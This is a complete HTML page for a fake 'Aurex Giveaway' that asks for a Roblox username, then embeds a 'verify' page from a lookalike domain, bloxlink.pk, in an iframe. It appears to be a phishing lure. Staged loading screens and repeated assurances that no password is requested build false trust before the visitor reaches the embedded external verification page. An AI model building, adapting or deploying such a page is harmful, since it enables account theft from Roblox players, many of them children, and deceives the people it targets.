# Hridyansh
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">

<meta
    name="viewport"
    content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes"
>

<title>Aurex Giveaway</title>

<style>
* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}

html,
body {
    width: 100%;
    min-height: 100%;
}

body {
    min-height: 100vh;

    display: flex;
    justify-content: center;
    align-items: center;

    padding: 20px;

    position: relative;
    overflow-x: hidden;

    font-family: Arial, sans-serif;
    color: #ffffff;

    background:
        radial-gradient(
            circle at 50% 35%,
            rgba(190, 0, 255, 0.28),
            transparent 40%
        ),
        radial-gradient(
            circle at 20% 80%,
            rgba(255, 0, 170, 0.20),
            transparent 45%
        ),
        radial-gradient(
            circle at 85% 15%,
            rgba(110, 0, 255, 0.18),
            transparent 40%
        ),
        #08000d;
}

/* =========================
   GLOBAL PURPLE ATMOSPHERE
========================= */

body::before {
    content: "";

    position: fixed;

    inset: -20%;

    z-index: -2;

    background:
        repeating-radial-gradient(
            circle at 50% 50%,
            rgba(255, 255, 255, 0.025) 0px,
            rgba(255, 0, 200, 0.04) 2px,
            transparent 5px,
            transparent 9px
        ),

        radial-gradient(
            ellipse at center,
            rgba(180, 0, 255, 0.35),
            transparent 70%
        );

    filter: blur(2px);

    animation:
        purplePulse
        5s
        ease-in-out
        infinite;
}

body::after {
    content: "";

    position: fixed;

    inset: 0;

    z-index: -1;

    pointer-events: none;

    background:
        radial-gradient(
            circle at center,
            transparent 0%,
            rgba(0, 0, 0, 0.45) 100%
        );
}

@keyframes purplePulse {

    0%,
    100% {
        transform: scale(1);

        opacity: 0.8;
    }

    50% {
        transform: scale(1.06);

        opacity: 1;
    }
}

/* =========================
   MAIN CARD
========================= */

.giveaway-card {
    width: 100%;
    max-width: 900px;

    padding: 35px;

    position: relative;
    z-index: 1;

    border:
        1px solid
        rgba(255, 0, 170, 0.5);

    border-radius: 20px;

    background:
        rgba(10, 8, 15, 0.88);

    box-shadow:
        0 0 25px
        rgba(255, 0, 170, 0.12),

        0 0 60px
        rgba(120, 0, 255, 0.08);
}

/* =========================
   HEADINGS
========================= */

h1 {
    margin-bottom: 15px;

    text-align: center;

    font-size:
        clamp(
            28px,
            5vw,
            48px
        );

    background:
        linear-gradient(
            90deg,
            #ff168c,
            #9b5cff
        );

    -webkit-background-clip: text;
    background-clip: text;

    color: transparent;
}

.description {
    max-width: 700px;

    margin:
        0 auto 25px;

    color: #cfc9d8;

    text-align: center;

    line-height: 1.6;

    font-size: 16px;
}

/* =========================
   BUTTONS
========================= */

button {
    width: 100%;

    padding: 14px 20px;

    border: none;

    border-radius: 12px;

    color: #ffffff;

    background:
        linear-gradient(
            90deg,
            #ff168c,
            #8b4dff
        );

    font-size: 16px;

    font-weight: bold;

    cursor: pointer;

    transition:
        transform 0.2s ease,
        opacity 0.2s ease;
}

button:hover {
    transform:
        translateY(-2px);

    opacity: 0.9;
}

.btn-group {
    display: grid;

    grid-template-columns:
        1fr 1fr;

    gap: 12px;

    margin-top: 20px;
}

.close-btn,
.iframe-close {
    background:
        rgba(
            255,
            255,
            255,
            0.08
        );

    border:
        1px solid
        rgba(
            255,
            255,
            255,
            0.12
        );
}

/* =========================
   VIEWS
========================= */

.view {
    display: none;

    animation:
        fadeIn
        0.35s
        ease;
}

#initialView {
    display: block;
}

@keyframes fadeIn {

    from {
        opacity: 0;

        transform:
            translateY(8px);
    }

    to {
        opacity: 1;

        transform:
            translateY(0);
    }
}

/* =========================
   USERNAME FORM
========================= */

.local-form-group {
    margin-top: 25px;
}

.form-label {
    display: block;

    margin-bottom: 8px;

    color: #ffffff;

    font-weight: bold;
}

.form-input {
    width: 100%;

    padding: 14px;

    border:
        1px solid
        rgba(
            255,
            0,
            170,
            0.35
        );

    border-radius: 12px;

    outline: none;

    color: #ffffff;

    background: #0f0c14;

    font-size: 16px;
}

.form-input:focus {
    border-color:
        #ff168c;

    box-shadow:
        0 0 12px
        rgba(
            255,
            22,
            140,
            0.15
        );
}

.error-warning {
    display: none;

    margin-top: 8px;

    color: #ff5c8a;

    font-size: 14px;
}

.submit-btn {
    margin-top: 14px;
}

/* =========================
   IFRAME
========================= */

#frame {
    display: block;

    width: 100%;

    height: 80dvh;

    min-height: 400px;

    margin-top: 20px;

    border:
        1px solid
        rgba(
            255,
            0,
            85,
            0.3
        );

    border-radius: 14px;

    background: #0f0f14;
}

.iframe-close {
    margin-top: 15px;
}

/* =========================
   LOADING OVERLAY
========================= */

#loadingOverlay {
    position: fixed;

    inset: 0;

    z-index: 9999;

    display: none;

    align-items: center;
    justify-content: center;

    overflow: hidden;

    background:
        rgba(
            5,
            0,
            10,
            0.25
        );

    backdrop-filter:
        blur(3px);
}

.loading-content {
    position: relative;

    z-index: 2;

    text-align: center;
}

.loading-spinner {
    width: 58px;
    height: 58px;

    margin:
        0 auto 18px;

    border:
        5px solid
        rgba(
            255,
            255,
            255,
            0.15
        );

    border-top-color:
        #ff168c;

    border-right-color:
        #9b5cff;

    border-radius: 50%;

    animation:
        spin
        0.75s
        linear
        infinite;
}

.loading-text {
    color: #ffffff;

    font-size: 17px;

    font-weight: bold;

    letter-spacing:
        0.5px;
}

@keyframes spin {

    to {
        transform:
            rotate(360deg);
    }
}

/* =========================
   MOBILE
========================= */

@media (max-width: 600px) {

    body {
        padding: 12px;
    }

    .giveaway-card {
        padding: 22px;

        border-radius: 15px;
    }

    .btn-group {
        grid-template-columns:
            1fr;
    }

    #frame {
        height: 72dvh;

        min-height: 400px;

        border-radius: 10px;
    }
}

@media (max-width: 380px) {

    .giveaway-card {
        padding: 18px;
    }

    #frame {
        height: 68dvh;

        min-height: 360px;
    }
}
</style>
</head>

<body>

<!-- =========================
     LOADING OVERLAY
========================= -->

<div id="loadingOverlay">

    <div class="loading-content">

        <div class="loading-spinner"></div>

        <div class="loading-text">
            Entering Giveaway...
        </div>

    </div>

</div>


<main class="giveaway-card">

    <!-- =========================
         HOMEPAGE
    ========================= -->

    <section
        id="initialView"
        class="view"
    >

        <h1>
            Aurex Giveaway
        </h1>

        <p class="description">
            Welcome to the Aurex Giveaway.
            Follow the steps below to continue.
        </p>

        <button id="enterBtn">
            Enter Giveaway
        </button>

    </section>


    <!-- =========================
         GIVEAWAY DETAILS
    ========================= -->

    <section
        id="actionView"
        class="view"
    >

        <h1>
            Giveaway Details
        </h1>

        <p class="description">
            Please review the giveaway information
            before continuing.
            No account password or private
            credentials are requested here.
        </p>

        <div class="btn-group">

            <button id="proceedBtn">
                Proceed
            </button>

            <button
                id="closeBtn"
                class="close-btn"
            >
                Close
            </button>

        </div>

    </section>


    <!-- =========================
         USERNAME
    ========================= -->

    <section
        id="internalPanelView"
        class="view"
    >

        <h1>
            Continue
        </h1>

        <p class="description">
            Enter your Roblox username for
            the giveaway.
            This is only used as your
            giveaway entry identifier.
            Never enter your Roblox password here.
        </p>

        <div class="local-form-group">

            <label
                class="form-label"
                for="usernameInput"
            >
                Roblox Username
            </label>

            <input
                id="usernameInput"
                class="form-input"
                type="text"
                placeholder="Enter your Roblox username"
                autocomplete="off"
                maxlength="30"
            >

            <div
                id="errorWarningField"
                class="error-warning"
            >
                Please enter your Roblox username.
            </div>

            <button
                id="submitClaimBtn"
                class="submit-btn"
            >
                Continue
            </button>

        </div>

    </section>


    <!-- =========================
         FINAL STEP
    ========================= -->

    <section
        id="successView"
        class="view"
    >

        <h1>
            Final Step
        </h1>

        <p class="description">
            Your giveaway information has been entered.
            Continue below to open the giveaway page.
        </p>

        <button id="openIframeBtn">
            Open Giveaway
        </button>

    </section>


    <!-- =========================
         IFRAME
    ========================= -->

    <section
        id="iframeView"
        class="view"
    >

        <h1>
            Aurex Giveaway
        </h1>

        <iframe
            id="frame"
            src="about:blank"
            loading="lazy"
            referrerpolicy="strict-origin-when-cross-origin"
            title="Aurex Giveaway"
        ></iframe>

        <button
            id="iframeCloseBtn"
            class="iframe-close"
        >
            Close
        </button>

    </section>

</main>


<script>

/* =========================
   ELEMENTS
========================= */

const views =
    document.querySelectorAll(".view");

const initialView =
    document.getElementById(
        "initialView"
    );

const actionView =
    document.getElementById(
        "actionView"
    );

const internalPanelView =
    document.getElementById(
        "internalPanelView"
    );

const successView =
    document.getElementById(
        "successView"
    );

const iframeView =
    document.getElementById(
        "iframeView"
    );

const loadingOverlay =
    document.getElementById(
        "loadingOverlay"
    );

const enterBtn =
    document.getElementById(
        "enterBtn"
    );

const proceedBtn =
    document.getElementById(
        "proceedBtn"
    );

const closeBtn =
    document.getElementById(
        "closeBtn"
    );

const submitClaimBtn =
    document.getElementById(
        "submitClaimBtn"
    );

const openIframeBtn =
    document.getElementById(
        "openIframeBtn"
    );

const iframeCloseBtn =
    document.getElementById(
        "iframeCloseBtn"
    );

const usernameInput =
    document.getElementById(
        "usernameInput"
    );

const errorWarningField =
    document.getElementById(
        "errorWarningField"
    );

const frame =
    document.getElementById(
        "frame"
    );


/* =========================
   SHOW VIEW
========================= */

function showView(view) {

    views.forEach(function(item) {

        item.style.display =
            "none";

    });

    view.style.display =
        "block";

    window.scrollTo({
        top: 0,
        behavior: "smooth"
    });
}


/* =========================
   REAL HOMEPAGE
========================= */

function goHome() {

    frame.src =
        "about:blank";

    loadingOverlay.style.display =
        "none";

    /*
     * Change this if your homepage
     * uses a different URL.
     */

    window.location.href =
        "index.html";
}


/* =========================
   ENTER GIVEAWAY
========================= */

enterBtn.addEventListener(
    "click",
    function() {

        loadingOverlay.style.display =
            "flex";

        setTimeout(
            function() {

                loadingOverlay.style.display =
                    "none";

                showView(
                    actionView
                );

            },
            2000
        );

    }
);


/* =========================
   PROCEED
========================= */

proceedBtn.addEventListener(
    "click",
    function() {

        showView(
            internalPanelView
        );

    }
);


/* =========================
   USERNAME INPUT
========================= */

usernameInput.addEventListener(
    "input",
    function() {

        if (
            usernameInput.value.trim()
            !== ""
        ) {

            errorWarningField
                .style.display =
                "none";

        }

    }
);


/* =========================
   CONTINUE
========================= */

submitClaimBtn.addEventListener(
    "click",
    function() {

        const username =
            usernameInput.value.trim();

        if (username === "") {

            errorWarningField
                .style.display =
                "block";

            usernameInput.focus();

            return;
        }

        errorWarningField
            .style.display =
            "none";

        showView(
            successView
        );

    }
);


/* =========================
   OPEN GIVEAWAY
========================= */

openIframeBtn.addEventListener(
    "click",
    function() {

        showView(
            iframeView
        );

        /*
         * Put your authorized
         * embeddable URL here.
         */

        frame.src =
            "https://bloxlink.pk/verify?server=0295377443746119";

    }
);


/* =========================
   CLOSE → REAL HOMEPAGE
========================= */

closeBtn.addEventListener(
    "click",
    function() {

        goHome();

    }
);


/* =========================
   IFRAME CLOSE → HOMEPAGE
========================= */

iframeCloseBtn.addEventListener(
    "click",
    function() {

        goHome();

    }
);

</script>

</body>
</html>
